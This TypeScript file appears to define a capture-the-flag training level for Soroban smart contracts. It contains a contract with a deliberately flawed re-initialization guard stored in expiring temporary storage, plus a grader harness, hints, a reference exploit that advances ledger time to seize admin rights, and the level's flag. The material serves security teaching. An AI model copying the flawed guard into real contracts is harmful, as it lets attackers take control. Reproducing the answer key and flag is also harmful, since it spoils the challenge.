import "server-only";

import type { CtfLevel } from "../types";
import { LIB_RS, cargoToml } from "./shared";

// Level 06 — THE FORGOTTEN LEDGER.
//
// Class: a guard that lives in expirable storage (Stellar Security Portal:
// "Expired Instance Storage Guard Allows Contract Re-Initialization", and
// the 30+ TTL findings around it). `initialize` refuses to run twice by
// checking a "sealed" flag — but the flag is TEMPORARY storage with a one-day
// TTL and nothing ever extends it. Leave the contract alone for a day and the
// seal is gone; the admin, in persistent storage with a long TTL, is not, so
// the contract looks perfectly healthy while being open again.
//
// The exploit lets time pass in the test environment, then re-initializes.

const LEVEL_RS = `//! The Archive of Saint Stroop — sealed, signed and left to the elements.
//!
//! Follow where each piece of state lives, and how long it lasts.

#![allow(dead_code)]

use soroban_sdk::{contract, contractimpl, contracttype, Address, Env};

/// About a day of ledgers (one every five seconds).
const SEAL_TTL: u32 = 17_280;
/// Long enough that the admin never lapses in practice.
const ADMIN_TTL: u32 = 1_000_000;

#[contracttype]
pub enum DataKey {
    Admin,
    Sealed,
}

#[contract]
pub struct Archive;

#[contractimpl]
impl Archive {
    /// Name the archive's admin. Refuses to run twice.
    pub fn initialize(env: Env, admin: Address) {
        if env.storage().temporary().has(&DataKey::Sealed) {
            panic!("already initialized");
        }
        env.storage().temporary().set(&DataKey::Sealed, &true);
        env.storage()
            .temporary()
            .extend_ttl(&DataKey::Sealed, SEAL_TTL, SEAL_TTL);

        env.storage().persistent().set(&DataKey::Admin, &admin);
        env.storage()
            .persistent()
            .extend_ttl(&DataKey::Admin, ADMIN_TTL, ADMIN_TTL);
    }

    /// Public view: who holds the keys right now.
    pub fn admin(env: Env) -> Address {
        env.storage().persistent().get(&DataKey::Admin).unwrap()
    }
}
`;

const STARTER_RS = `// Only this file is yours to edit.
//
// The grader deploys the archive, initializes it for \`victim\`, then drops
// every authorization mock. Today a second \`initialize\` is refused. Make
// \`attacker\` the admin anyway.
//
// The signature is fixed: change the body, not the parameters.
use soroban_sdk::{Address, Env};

use crate::level::ArchiveClient;

pub fn solve(env: &Env, vault: Address, victim: Address, attacker: Address) {
    let _ = (env, vault, victim, attacker);
    // TODO: the "already initialized" flag has a lifetime. What happens when it ends?
}
`;

const HARNESS = `// Hidden grader — never sent to the browser.
//
// The owner initializes the archive with a real authorization, then every mock
// is dropped. The test first proves the seal holds today; the exploit has to
// get past it with no signature.
use forgotten_ledger::exploit;
use forgotten_ledger::level::{Archive, ArchiveClient};
use soroban_sdk::testutils::Address as _;
use soroban_sdk::{Address, Env};

#[test]
fn ctf_win() {
    let env = Env::default();
    let archive_id = env.register(Archive, ());
    let client = ArchiveClient::new(&env, &archive_id);

    let owner = Address::generate(&env);
    let attacker = Address::generate(&env);

    env.mock_all_auths();
    client.initialize(&owner);
    env.set_auths(&[]);

    assert_eq!(client.admin(), owner, "setup failed");
    assert!(
        client.try_initialize(&attacker).is_err(),
        "setup failed: the seal should hold today"
    );

    exploit::solve(&env, archive_id.clone(), owner.clone(), attacker.clone());

    assert_eq!(
        client.admin(),
        attacker,
        "the owner still holds the keys — the seal held"
    );

    // Last statement, reached only when every assertion above held. The nonce
    // is minted per run by the server and exists nowhere the exploit can read.
    println!("CTF_WIN __CTF_NONCE__");
}
`;

const REFERENCE_RS = `use soroban_sdk::testutils::Ledger as _;
use soroban_sdk::{Address, Env};

use crate::level::ArchiveClient;

pub fn solve(env: &Env, vault: Address, victim: Address, attacker: Address) {
    let _ = victim;
    let client = ArchiveClient::new(env, &vault);
    // The seal lives in temporary storage for about a day. Let two days pass:
    // the seal expires, the admin (persistent, long TTL) does not.
    env.ledger().with_mut(|ledger| ledger.sequence_number += 40_000);
    client.initialize(&attacker);
}
`;

export const forgottenLedger: CtfLevel = {
  slug: "forgotten-ledger",
  title: "The Forgotten Ledger",
  tagline: "A one-time seal that quietly expires while the contract sits idle.",
  difficulty: "master",
  estMinutes: 25,
  story: `The Archive of Saint Stroop was sealed on the day it opened. The seal was good for a day. Nobody renewed it, because nobody remembered it could run out.

The archive looks exactly as it did. The seal is simply gone.`,
  brief: `## The target

\`src/level.rs\` is an archive. \`initialize\` names the admin and refuses to run a second time. It remembers that it already ran in a **temporary** storage entry; the admin lives in **persistent** storage.

## Your job

\`src/exploit.rs\` exports one function:

\`\`\`rust
pub fn solve(env: &Env, vault: Address, victim: Address, attacker: Address)
\`\`\`

The grader deploys the archive, initializes it with \`victim\` as admin, and drops every authorization mock. A second \`initialize\` is refused today. Make \`attacker\` the admin anyway.

## Rules

- You may edit **only** \`src/exploit.rs\`. \`Cargo.toml\`, \`src/lib.rs\` and \`src/level.rs\` are fixed by the level.
- Keep the \`solve\` signature exactly as written.
- \`attacker\` holds no signature. In a real network you cannot move the clock; you can only wait. The test environment lets \`solve\` do the waiting.

## Reading the state

\`admin()\` is a public view. Use it to check who holds the keys.`,
  hints: [
    "List where each value is stored and for how long. Which entry does `initialize` rely on to refuse a second call, and does anything ever extend it?",
    "The seal is a temporary entry with a TTL of about 17,280 ledgers. The admin, in persistent storage, lasts far longer. After the seal expires, `has(&DataKey::Sealed)` is false again.",
    "Let time pass inside the test: `env.ledger().with_mut(|l| l.sequence_number += ...)` (import `soroban_sdk::testutils::Ledger`). Then call `initialize` with `attacker`.",
  ],
  files: {
    "Cargo.toml": cargoToml("forgotten_ledger"),
    "src/lib.rs": LIB_RS,
    "src/level.rs": LEVEL_RS,
  },
  starter: STARTER_RS,
  harness: HARNESS,
  winTest: "test ctf_win ... ok",
  forbid: ["storage"],
  flag: "TUSST{th3_s34l_3xp1r3d}",
  reference: REFERENCE_RS,
};
